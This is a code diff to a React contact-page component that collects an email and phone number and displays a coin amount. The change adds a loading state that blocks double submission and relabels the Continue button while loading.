@@ -15,6 +15,7 @@ const ContactPage = () => {
   const [countryCode, setCountryCode] = useState('+1');
   const [isEmailValid, setIsEmailValid] = useState(false);
   const [tiktokData, setTiktokData] = useState(null);
+  const [isLoading, setIsLoading] = useState(false);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const sessionId = localStorage.getItem('sessionId');
   const username = localStorage.getItem('username');
@@ -40,6 +41,8 @@ const ContactPage = () => {
   };
 
   const handleSubmit = async () => {
+  if (isLoading) return;
+  setIsLoading(true);
     if (email.trim() && phone.trim() && isEmailValid) {
       const fullPhone = `${countryCode}${phone}`;
       localStorage.setItem('email', email);
@@ -243,10 +246,10 @@ const ContactPage = () => {
         {/* Submit Button */}
         <Button
           onClick={handleSubmit}
-          disabled={!email.trim() || !phone.trim() || !isEmailValid}
+          disabled={!email.trim() || !phone.trim() || !isEmailValid || isLoading}
           className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f73157] hover:to-[#f73157] text-gray-400 hover:text-white font-semibold py-5 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          Continue
+          {isLoading ? 'Loading...' : 'Continue'}
         </Button>
 
         {/* Coins Display */}
